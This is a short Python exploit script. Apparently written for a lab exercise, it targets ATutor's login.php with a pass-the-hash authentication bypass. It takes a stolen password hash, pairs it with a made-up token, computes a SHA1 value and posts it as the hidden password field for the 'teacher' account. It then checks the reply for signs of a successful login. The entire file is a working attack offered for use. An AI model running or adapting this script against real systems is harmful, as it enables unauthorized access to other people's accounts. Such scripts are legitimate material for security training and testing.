import sys, hashlib, requests

def gen_hash(password, token):
	joined = password + token
	joined_hashed = hashlib.sha1(joined.encode("utf-8"))

	return str(joined_hashed.hexdigest())

def we_can_login_with_a_hash():
	target="http://%s/ATutor/login.php" % sys.argv[1]
	## Token is our own entirely made up value based on what we see in login_functions_inc.php
	token="hax"

	hashed=gen_hash(sys.argv[2], token)
	d = {
		"form_password_hidden" : hashed,
		"form_login" : "teacher",
		"submit" : "Login",
		"token" : token
	}

	print("Login: " + d["form_login"])
	print("form_password_hidden: " + d["form_password_hidden"])
	print("token: " + d["token"])

	s = requests.Session()
	r = s.post(target, data=d)

	result = r.text

	if "Create Course: My Start Page" in result or "My Courses: My Start Page" in result:
		return True
	return False

def main():
	if len(sys.argv) !=3:
		print ("(+) usage: %s <target> <hash> ") % sys.argv[0]
		print ("(+) eg: %s 192.168.211.203 16521465152312313") % sys.argv[0]
		sys.exit(-1)

	if we_can_login_with_a_hash():
		print("[+] Success!")
	else:
		print("[+] Failure!")


if __name__ == "__main__":
	main()
